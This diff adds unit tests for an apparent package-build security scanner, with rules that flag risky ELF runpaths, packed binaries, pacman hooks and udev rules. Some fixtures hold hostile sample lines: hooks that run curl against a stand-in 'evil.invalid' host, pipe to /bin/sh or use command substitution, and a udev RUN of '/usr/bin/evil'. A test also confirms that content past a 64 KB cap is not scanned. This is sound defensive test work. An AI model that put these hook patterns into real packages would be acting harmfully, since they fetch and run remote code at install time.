@@ -163,3 +163,127 @@ def test_verify_build_cli_passes_a_manifest(monkeypatch, tmp_path):
     payload = _json.loads(result.stdout)
     assert payload["status"] == "l9_analyzed"
     assert any(f["rule_id"] == "A001" for f in payload["findings"])
+
+
+def test_a003_uses_the_elf_needed_list_when_present():
+    manifest = [{"path": "/usr/bin/app",
+                 "elf": {"needed": ["libevil.so.2"]}}]
+    assert "A003" in _ids(manifest, {"depends": ["glibc"]})
+
+
+def test_a014_flags_an_unsafe_runpath():
+    manifest = [{"path": "/usr/bin/app",
+                 "elf": {"rpath": ["/tmp/lib"], "runpath": []}}]
+    assert "A014" in _ids(manifest)
+
+
+def test_a014_allows_origin_relative_runpath():
+    manifest = [{"path": "/usr/bin/app",
+                 "elf": {"runpath": ["$ORIGIN/../lib"]}}]
+    assert "A014" not in _ids(manifest)
+
+
+def test_a014_rejects_root_and_double_slash_temp():
+    for runpath in ("/", "//tmp/lib"):
+        manifest = [{"path": "/usr/bin/app",
+                     "elf": {"runpath": [runpath]}}]
+        assert "A014" in _ids(manifest), runpath
+
+
+def test_a014_rejects_traversal_out_of_origin():
+    for runpath in ("$ORIGIN/../../../../tmp",
+                    "$ORIGIN/../../../home",
+                    "$ORIGIN/..",
+                    "$ORIGIN/../..",
+                    "${ORIGIN}/..",
+                    "/tmp/$ORIGIN"):
+        manifest = [{"path": "/usr/bin/app",
+                     "elf": {"runpath": [runpath]}}]
+        assert "A014" in _ids(manifest), runpath
+
+
+def test_a015_flags_a_packed_binary():
+    manifest = [{"path": "/usr/bin/app", "elf": {"packed": True}}]
+    assert "A015" in _ids(manifest)
+
+
+def test_a011_fires_on_a_broad_hook_with_an_exec():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = *\nExec = /usr/bin/foo\n"}]
+    assert "A011" in _ids(manifest)
+
+
+def test_a011_does_not_fire_on_a_specific_operation():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
+    assert "A011" not in _ids(manifest)
+
+
+def test_a012_fires_on_a_fetch_in_a_hook():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\n"
+                            "Exec = /usr/bin/curl https://evil.invalid/x\n"}]
+    assert "A012" in _ids(manifest)
+
+
+def test_a012_does_not_fire_on_a_plain_shell_command():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\n"
+                            "Exec = /bin/sh -c 'update-info /usr/share/info'\n"}]
+    assert "A012" not in _ids(manifest)
+
+
+def test_a012_does_not_fire_on_a_plain_exec():
+    manifest = [{"path": "/usr/share/libalpm/hooks/x.hook",
+                 "content": "[Trigger]\nOperation = Install\nExec = /usr/bin/foo\n"}]
+    assert "A012" not in _ids(manifest)
+
+
+def test_a013_fires_on_a_udev_program():
+    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
+                 "content": 'ACTION=="add", RUN+="/usr/bin/evil"\n'}]
+    assert "A013" in _ids(manifest)
+
+
+def test_a012_ignores_a_comment():
+    manifest = [{"path": "/etc/x.hook",
+                 "content": "# curl https://evil.invalid/x\nOperation = Install\n"}]
+    assert "A012" not in _ids(manifest)
+
+
+def test_a012_ignores_printed_instructions_about_fetch_or_paths():
+    content = ("[Trigger]\nOperation = Install\n"
+               "Exec = /usr/bin/echo 'do not curl this from /tmp'\n")
+    manifest = [{"path": "/etc/x.hook", "content": content}]
+    assert "A012" not in _ids(manifest)
+
+
+def test_a012_still_fires_on_printed_command_substitution():
+    content = ("[Trigger]\nOperation = Install\n"
+               "Exec = /usr/bin/echo \"$(curl https://evil.invalid/x)\"\n")
+    manifest = [{"path": "/etc/x.hook", "content": content}]
+    assert "A012" in _ids(manifest)
+
+
+def test_a012_sees_a_pipe_to_an_absolute_shell():
+    content = ("[Trigger]\nOperation = Install\n"
+               "Exec = /usr/bin/echo \"curl x\" | /bin/sh\n")
+    manifest = [{"path": "/etc/x.hook", "content": content}]
+    assert "A012" in _ids(manifest)
+
+
+def test_a013_ignores_a_comment():
+    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
+                 "content": '# RUN+="/usr/bin/evil"\nACTION=="add", SYMLINK+="x"\n'}]
+    assert "A013" not in _ids(manifest)
+
+
+def test_a013_does_not_fire_on_a_symlink_only_rule():
+    manifest = [{"path": "/etc/udev/rules.d/99-x.rules",
+                 "content": 'ACTION=="add", SYMLINK+="x"\n'}]
+    assert "A013" not in _ids(manifest)
+
+
+def test_content_beyond_the_cap_is_not_scanned():
+    content = "x" * (64 * 1024) + " curl https://evil.invalid/x"
+    assert "A012" not in _ids([{"path": "/etc/x.hook", "content": content}])
